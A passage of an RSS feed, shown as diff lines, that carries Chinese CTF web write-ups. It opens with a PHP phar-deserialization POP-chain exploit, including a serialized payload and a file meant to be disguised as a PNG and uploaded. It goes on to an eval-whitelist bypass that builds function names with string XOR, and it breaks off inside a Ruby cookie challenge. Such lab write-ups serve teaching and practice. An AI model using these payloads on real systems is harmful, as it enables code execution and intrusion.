$arguments);&#xA;    }&#xA;}&#xA;&#xA;class Show{&#xA;    public $source;&#xA;    public $str;&#xA;    public $reader;&#xA;    public function __construct($file=&amp;#39;index.php&amp;#39;) {&#xA;        $this-&amp;gt;source = $file;&#xA;        echo &amp;#39;Welcome to &amp;#39;.$this-&amp;gt;source.&amp;#34;&amp;lt;br&amp;gt;&amp;#34;;&#xA;    }&#xA;    public function __toString() {&#xA;        echo &amp;#39;string--------&amp;#39;;&#xA;        $this-&amp;gt;str-&amp;gt;reset();&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    public function __wakeup() {&#xA;&#xA;        if(preg_match(&amp;#34;/gopher|phar|http|file|ftp|dict|\.\./i&amp;#34;, $this-&amp;gt;source)) {&#xA;            throw new Exception(&amp;#39;invalid protocol found in &amp;#39;.__CLASS__);&#xA;            echo &amp;#39;111111111111111111&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    public function reset() {&#xA;&#xA;        if ($this-&amp;gt;reader !== null) {&#xA;            echo &amp;#39;reset----&amp;#39;; &#xA;            $this-&amp;gt;reader-&amp;gt;close();&#xA;        }&#xA;    }&#xA;}&#xA;$a=new Show();&#xA;$a-&amp;gt;str=&amp;#39;1&amp;#39;;&#xA;$b=new Show;&#xA;$b-&amp;gt;reader=&amp;#39;1&amp;#39;;&#xA;&#xA;$d=new Content;&#xA;$d-&amp;gt;formatters[&amp;#39;close&amp;#39;]=array(new Action,&amp;#39;run&amp;#39;);&#xA;&#xA;$a-&amp;gt;reader=$d;&#xA;$b-&amp;gt;str=$a;&#xA;&#xA;&#xA;$c=new Show($b);&#xA;$c-&amp;gt;str=&amp;#39;1&amp;#39;;&#xA;$c-&amp;gt;reader=&amp;#39;1&amp;#39;;&#xA;&#xA;&#xA;// $a=&amp;#39;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;O:4:&amp;#34;Show&amp;#34;:3:{s:6:&amp;#34;source&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;O:7:&amp;#34;Content&amp;#34;:1:{s:10:&amp;#34;formatters&amp;#34;;a:1:{s:5:&amp;#34;close&amp;#34;;a:2:{i:0;O:6:&amp;#34;Action&amp;#34;:2:{s:11:&amp;#34;checkAccess&amp;#34;;s:9:&amp;#34;index.php&amp;#34;;s:2:&amp;#34;id&amp;#34;;s:2:&amp;#34;0a&amp;#34;;}i:1;s:3:&amp;#34;run&amp;#34;;}}}}s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}s:3:&amp;#34;str&amp;#34;;s:1:&amp;#34;1&amp;#34;;s:6:&amp;#34;reader&amp;#34;;s:1:&amp;#34;1&amp;#34;;}&amp;#39;;&#xA;// unserialize($a)&#xA;&#xA;&#xA;//show  _construct  _tostring  reset   content  _call  close  ,$this-&amp;gt;formatters【&amp;#39;close&amp;#39;】 = 【new Action(), &amp;#39;run&amp;#39;】&#xA;&#xA;&#xA;$phar=new phar(&amp;#39;test.phar&amp;#39;);&#xA;$phar-&amp;gt;startBuffering();&#xA;$phar-&amp;gt;setStub(&amp;#34;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#34;);&#xA;$phar-&amp;gt;setMetadata($c);&#xA;$phar-&amp;gt;addFromString(&amp;#34;flag.txt&amp;#34;,&amp;#34;flag&amp;#34;);&#xA;$phar-&amp;gt;stopBuffering();&#xA;&#xA;?&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;改了后缀png,上传上去,触发&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>LOVE_math</title>
+      <link>http://localhost:1313/docs/wp/love_math/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/wp/love_math/</guid>
+      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;error_reporting&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//听说你很喜欢数学，不知道你是否爱它胜过爱flag&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;])){&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//例子 c=20-1&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $content &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;($content) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;太长了不会算&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $blacklist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\t&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\[&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\]&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; ($blacklist &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $blackitem) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $blackitem &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/m&amp;#39;&lt;/span&gt;, $content)) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请不要输入奇奇怪怪的字符&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $whitelist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;,  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt; , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match_all&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&amp;#39;&lt;/span&gt;, $content, $used_funcs);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; ($used_funcs[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; $func) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;in_array&lt;/span&gt;($func, $whitelist)) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;请不要输入奇奇怪怪的函数&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//帮你算出答案&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;echo &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$content&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好骚的姿势啊&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;,  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt; , &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;($k&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;$k&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sizeof&lt;/span&gt;($payload);$k&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;($i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;$i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;; $i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;($j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;$j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;;$j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $exp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $payload[$k] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; $i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$j;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt;($payload[$k]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$i$j&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$exp&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;字符串异或&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>ruby_cookie</title>
+      <link>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</link>
+      <pubDate>Sun, 08 Dec 2024 14:03:24 +0800</pubDate>
+      <guid>http://localhost:1313/docs/wp/webexercise/ruby_cookie/</guid>
+      <description>&lt;h2 id=&#34;ruby_cookie&#34;&gt;&#xD;&#xA;  ruby_cookie&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#ruby_cookie&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&#xD;&#xA;&lt;h4 id=&#34;from-buuctf-bsidescf-2019mixer&#34;&gt;&#xD;&#xA;  from: buuctf [BSidesCF 2019]Mixer&#xD;&#xA;  &lt;a class=&#34;anchor&#34; href=&#34;#from-buuctf-bsidescf-2019mixer&#34;&gt;#&lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&#xD;&#xA;&lt;p&gt;看到rack-cookie &lt;a href=&#34;https://www.freebuf.com/vuls/181368.html&#34;&gt;找了个文章&lt;/a&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;require &amp;#34;uri&amp;#34;&#xA;require &amp;#34;base64&amp;#34;&#xA;require &amp;#34;pp&amp;#34;&#xA;encoded_string = 